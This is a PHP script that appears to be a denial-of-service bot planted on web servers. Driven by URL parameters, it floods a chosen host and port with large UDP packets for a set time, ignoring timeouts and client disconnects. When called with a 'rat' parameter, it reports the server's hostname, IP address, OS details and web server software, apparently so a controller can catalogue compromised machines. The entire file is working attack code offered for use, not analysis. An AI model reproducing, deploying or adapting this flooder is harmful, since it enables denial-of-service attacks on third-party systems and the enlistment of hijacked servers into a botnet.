<?php

set_time_limit(999999);
$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$Sendlen = 65535;
$packets = 0;
ignore_user_abort(True);
if (strlen($host)==0 or strlen($port)==0 or strlen($exec_time)==0){
    if (strlen($_GET['rat'])<>0){
        echo $_GET['rat'].$_SERVER["HTTP_HOST"]."|".gethostbyname($_SERVER['SERVER_NAME'])
            ."|".php_uname()."|".$_SERVER['SERVER_SOFTWARE'].$_GET['rat'];
        exit;
    }
    echo "Warning to: opening";
    exit;
}
for($i=0;$i<$Sendlen;$i++){
    $out .= "A";
}
$max_time = time()+$exec_time;
while(1){
    $packets++;
    if(time() > $max_time){
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
    if($fp){
        fwrite($fp, $out);
        fclose($fp);
    }
}
echo "Send Host：$host:$port<br><br>";
echo "Send Flow：$packets * ($Sendlen/1024=" . round($Sendlen/1024, 2) . ")kb / 1024 = " . round($packets*$Sendlen/1024/1024, 2) . " mb<br><br>";
echo "Send Rate：" . round($packets/$exec_time, 2) . " packs/s；" . round($packets/$exec_time*$Sendlen/1024/1024, 2) . " mb/s";
